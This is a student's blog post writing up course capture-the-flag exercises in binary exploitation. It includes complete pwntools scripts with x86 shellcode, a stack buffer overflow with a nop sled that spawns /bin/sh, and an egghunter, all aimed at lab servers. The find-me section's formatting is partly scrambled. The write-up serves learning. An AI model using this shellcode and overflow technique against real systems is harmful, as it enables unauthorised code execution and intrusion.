<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Expanding on the buffer overflow to ShellCode, and methods to write it">
<meta property="og:type" content="article">
<meta property="og:title" content="Ah, So Now We&#39;re Injecting Machine Code">
<meta property="og:url" content="http://mordy.quest/shellcode/index.html">
<meta property="og:site_name" content="Mordy&#39;s Blog">
<meta property="og:description" content="Expanding on the buffer overflow to ShellCode, and methods to write it">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://mordy.quest/shellcode/chall2.png">
<meta property="article:published_time" content="2020-06-28T15:10:31.582Z">
<meta property="article:modified_time" content="2024-09-28T14:16:02.099Z">
<meta property="article:author" content="Mordy">
<meta property="article:tag" content="Code">
<meta property="article:tag" content="Binary Exploitation">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://mordy.quest/shellcode/chall2.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Ah, So Now We&#39;re Injecting Machine Code</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/aslr/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/buffer-overflows/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://mordy.quest/shellcode/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://mordy.quest/shellcode/&text=Ah, So Now We&#39;re Injecting Machine Code"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://mordy.quest/shellcode/&title=Ah, So Now We&#39;re Injecting Machine Code"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://mordy.quest/shellcode/&is_video=false&description=Ah, So Now We&#39;re Injecting Machine Code"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Ah, So Now We&#39;re Injecting Machine Code&body=Check out this article: http://mordy.quest/shellcode/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://mordy.quest/shellcode/&title=Ah, So Now We&#39;re Injecting Machine Code"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://mordy.quest/shellcode/&title=Ah, So Now We&#39;re Injecting Machine Code"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://mordy.quest/shellcode/&title=Ah, So Now We&#39;re Injecting Machine Code"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://mordy.quest/shellcode/&title=Ah, So Now We&#39;re Injecting Machine Code"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://mordy.quest/shellcode/&name=Ah, So Now We&#39;re Injecting Machine Code&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://mordy.quest/shellcode/&t=Ah, So Now We&#39;re Injecting Machine Code"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Chall2-png"><span class="toc-number">1.</span> <span class="toc-text">Chall2.png</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Simple"><span class="toc-number">2.</span> <span class="toc-text">Simple</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellz"><span class="toc-number">3.</span> <span class="toc-text">shellz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#find-me"><span class="toc-number">4.</span> <span class="toc-text">find-me</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Ah, So Now We&#39;re Injecting Machine Code
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Mordy</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-06-28T15:10:31.582Z" itemprop="datePublished">2020-06-28</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/Binary-Exploitation/" rel="tag">Binary Exploitation</a>, <a class="tag-link-link" href="/tags/Code/" rel="tag">Code</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="Chall2-png"><a href="#Chall2-png" class="headerlink" title="Chall2.png"></a>Chall2.png</h2><hr>
<img src="/shellcode/chall2.png" class="">

<p>Weekly assembly to C conversion: Here’s a quick rundown of my thoughts.</p>
<ol>
<li>There are clear signs of a loop: branching, returning to previous instructions, <code>jle</code>, loop-counter-ish variable (<code>var_14</code> or <code>ebp - 0xc</code>). I went with a while loop here.</li>
<li>The <code>test</code> and <code>je</code> gives away the if statement that is inside the loop.</li>
<li>I don’t really know what’s inside <code>data_8048510</code>, but because it is passed as an argument to the printf function, it is likely a format string. Since the loop counter is likely to be a 4-byte integer, I went with <code>&quot;%d&quot;</code> and a <code>&quot;\n&quot;</code> for cleanliness. It doesn’t have to be that, and could even be a sentence where the loop counter is plugged in.</li>
</ol>
<p><strong>Note:</strong> I haven’t put in argv because it was never accessed. Also, the include is not part of the image, it’s just so that you can run printf.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc) &#123;</span><br><span class="line">    int i = 0;</span><br><span class="line">    while (i &lt;= 9) &#123;</span><br><span class="line">        if (i != 1) &#123;</span><br><span class="line">            printf(&quot;%d\n&quot;, i);</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Simple"><a href="#Simple" class="headerlink" title="Simple"></a>Simple</h2><hr>
<p>FLAG{REDACTED}</p>
<hr>
<p>This was my first time ever writing shellcode. While I had attempted bof, I never imagined writing custom shellcode.</p>
<p>Carrying on from the lab this week, for this challenge all we needed was to read from the open file descriptor (fd &#x3D; 1000) and write it to stdout (fd &#x3D; 1).</p>
<ol>
<li>Using pwntools function <code>asm()</code> to convert assembly to machine code, I wrote it to the stack. When the program executes the buffer, the shellcode would be able to write out the open flag file using a <code>read</code> and a <code>write</code> syscall.</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./simple&#x27;)</span><br><span class="line">p = remote(&#x27;plsdonthaq.me&#x27;, 3001)</span><br><span class="line">#pause()</span><br><span class="line"></span><br><span class="line">code = asm(&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">sub esp, 0x200</span><br><span class="line">mov eax, 0x3</span><br><span class="line">mov ebx, 1000</span><br><span class="line">mov ecx, esp</span><br><span class="line">mov edx, 0x200</span><br><span class="line">int 0x80</span><br><span class="line"></span><br><span class="line">mov edx, eax</span><br><span class="line">mov eax, 0x4</span><br><span class="line">mov ebx, 1</span><br><span class="line">mov ecx, esp</span><br><span class="line">int 0x80</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="shellz"><a href="#shellz" class="headerlink" title="shellz"></a>shellz</h2><hr>
<p>FLAG{REDACTED}</p>
<hr>
<p>Bit harder than the first one, this challenge combined writing shellcode with a buffer overflow. We’re given a random pointer on the stack, along with a vulnerable buffer. All we now need to do is to get it to execute our shellcode which is somewhere on the stack, but not too far from the pointer itself.<br>If you’re like me, and you watched some liveoverflow videos during the break, then this one is <code>tRiVIaL</code> :P</p>
<p>Here’s some main points to think about:</p>
<ol>
<li>The shellcode itself is a simple execve syscall that runs <code>/bin/sh</code>. Technically its <code>/bin//sh</code> using the trick from the lecture. I push the string onto the stack, load it in, make the syscall.</li>
<li>We write to the buffer using a vulnerable <code>gets()</code> call, and the size of the buffer is <code>0x2000</code>. With 8 bytes of <code>eax</code> and <code>ebp</code> on the stack, the return address is after that. Since we want to execute our buffer, we overwrite the return address with an offset to the pointer given. I chose <code>0xc5</code>, which worked best for me.</li>
<li>Finally the main part of this question. How do I get it to execute the correct code if it jumps to a random address? Answer? A <code>nop</code> slide. By padding the shellcode with (1000) <code>nop</code> instructions, we can start executing any one of these 1000 <code>nop</code> instructions before executing the main shellcode.</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./shellz&#x27;)</span><br><span class="line">p = remote(&#x27;plsdonthaq.me&#x27;, 3002)</span><br><span class="line"></span><br><span class="line">p.readuntil(&#x27;address: &#x27;)</span><br><span class="line">addr = p.readuntil(&#x27;\n&#x27;, drop=True)</span><br><span class="line"></span><br><span class="line">nops = asm(&#x27;nop&#x27;) * 1000</span><br><span class="line">code = asm(&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">push 0</span><br><span class="line">push &#123;&#125;</span><br><span class="line">push &#123;&#125;</span><br><span class="line"></span><br><span class="line">mov eax, 0xb</span><br><span class="line">mov ebx, esp</span><br><span class="line">mov ecx, 0</span><br><span class="line">mov edx, 0</span><br><span class="line">mov esi, 0</span><br><span class="line"></span><br><span class="line">int 0x80</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;.format(u32(&#x27;//sh&#x27;), u32(&#x27;/bin&#x27;)))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">padding = (0x2008 - len(nops) - len(code)) * b&#x27;A&#x27;</span><br><span class="line">ret = p32(int(addr.decode(), 16) - 0xc5)</span><br><span class="line"></span><br><span class="line">p.sendline(nops + code + padding + ret)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="find-me"><a href="#find-me" class="headerlink" title="find-me"></a>find-me</h2><hr>
<p>FLAG{REDACTED}</p>
<hr>
<p>Egghunter!?! I haven’t even done OS!<br>Not gonna lie, I need better x86 documentation&#x2F;tutorials. The amount of time I required to get to the <code>POP</code> instruction ahhhhhhhhhh!!</p>
<p>Quick rundown of what I did:</p>
<ol>
<li>The big buffer code is basically copied from the first one. Read from fd 1000, write to stdout.</li>
<li>The egghunter part. The small buffer. 20 bytes long (Mine’s 10 bytes yay!). It scans the memory for the big buffer and executes it. Actually its more destroying the memory than scanning tbh. Maybe if I counted the number of bytes I got off the stack, I could restore it hmmmmmm.<ol>
<li>It pops the first thing off the stack and puts it into <code>eax</code></li>
<li>Compares <code>eax</code> with the egg: <code>0x90909090</code></li>
<li>If it finds it, then it would jump to the instruction, otherwise would repeat 1</li>
</ol>
</li>
<li>One thing to note is that I am looking for 4 <code>nop</code> instructions. The main reason for that is the <code>POP</code> instruction I use. It would take 4 bytes off the stack, so if the egg that it is looking for is not aligned correctly the shellcode would simply skip over it. I can’t put <code>0xcafebabecafebabe</code> because it would skip over both of them if it doesn’t work. I don’t need to look for 4 <code>nop</code> instructions, just repeating bytes. I like <code>nop</code> however, because they are legal instructions and I can simply jump to it.</li>
</ol>
<p>Pitfalls&#x2F;Things to think about:</p>
<ol>
<li><pre><code>lp:
     add eax, 4
     mov ebx, [eax]
     cmp ebx, 0x90909090
     jne lp
     jmp eax
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   Before I came up with the `nop` idea, I struggled for so long with the `0xcafebabe` strategy, because it would skip over the big buffer and find itself perfectly. **This code also works**, it&#x27;s just longer. When I was searching from the pointer provided, this increased to 20 bytes and would refuse to run.</span><br><span class="line"></span><br><span class="line">2. `mov eax, &lt;ptr&gt;`. The pointer is a random pointer on the stack, so I can begin searching from anywhere. However, this is not a great plan because you would need to have a rough idea of where it is on the stack. And when there are thousands of 0s on the stack, probably not a great plan. You cannot determine what you searched properly if you use that method.</span><br><span class="line"></span><br><span class="line">3. The big issue of finding the small buffer before the large buffer. I suspect that the final program works all the time (It does, but it shouldn&#x27;t according to me. Maybe for this program, the small buffer as placed after the large buffer). It skips over itself, I believe because of the byte alignment issue (I may be wrong). I think it skips over the egg in the small buffer if it encounters it, because it does not go over every combination of 4 continuous bytes.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
from pwn import *
</code></pre>
</li>
</ol>
<p>#p &#x3D; process(‘.&#x2F;find-me’)<br>#pause()<br>p &#x3D; remote(‘plsdonthaq.me’, 3003)</p>
<p>p.readuntil(‘new stack ‘)<br>addr &#x3D; p.readuntil(‘\n’, drop&#x3D;True).decode()</p>
<p>smallCode &#x3D; asm(‘’’<br>lp:<br>    pop eax<br>    cmp eax, 0x90909090<br>    jne lp<br>    jmp esp</p>
<p>‘’’)</p>
<p>p.sendline(smallCode)<br>p.readuntil(‘bigbuf shellcode:’)<br>bigCode &#x3D; asm(‘’’</p>
<p>sub esp, 0x200<br>mov eax, 0x3<br>mov ebx, 1000<br>mov ecx, esp<br>mov edx, 0x200<br>int 0x80</p>
<p>mov edx, eax<br>mov eax, 0x4<br>mov ebx, 1<br>mov ecx, esp<br>int 0x80</p>
<p>‘’’)</p>
<p>padding &#x3D; asm(‘nop’) * ((0x100 - len(bigCode))&#x2F;&#x2F;2)<br>p.sendline(padding + bigCode + padding)</p>
<p>p.interactive()</p>
<pre><code>
## Conclusion

---

Wow, you weren&#39;t lying when you said `make sure to print, read and memorise the intel x86 manual`. Finding instructions to make smaller shellcode was a very interesting task, especially because I couldn&#39;t find consise documentation.

Overall, shellcode was pretty fun.

&gt; _All we need now is for someone to make a JavaScript plugin for this_
</code></pre>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Chall2-png"><span class="toc-number">1.</span> <span class="toc-text">Chall2.png</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Simple"><span class="toc-number">2.</span> <span class="toc-text">Simple</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellz"><span class="toc-number">3.</span> <span class="toc-text">shellz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#find-me"><span class="toc-number">4.</span> <span class="toc-text">find-me</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://mordy.quest/shellcode/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://mordy.quest/shellcode/&text=Ah, So Now We&#39;re Injecting Machine Code"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://mordy.quest/shellcode/&title=Ah, So Now We&#39;re Injecting Machine Code"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://mordy.quest/shellcode/&is_video=false&description=Ah, So Now We&#39;re Injecting Machine Code"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Ah, So Now We&#39;re Injecting Machine Code&body=Check out this article: http://mordy.quest/shellcode/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://mordy.quest/shellcode/&title=Ah, So Now We&#39;re Injecting Machine Code"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://mordy.quest/shellcode/&title=Ah, So Now We&#39;re Injecting Machine Code"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://mordy.quest/shellcode/&title=Ah, So Now We&#39;re Injecting Machine Code"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://mordy.quest/shellcode/&title=Ah, So Now We&#39;re Injecting Machine Code"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://mordy.quest/shellcode/&name=Ah, So Now We&#39;re Injecting Machine Code&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://mordy.quest/shellcode/&t=Ah, So Now We&#39;re Injecting Machine Code"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2019-2024
    Mordy
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
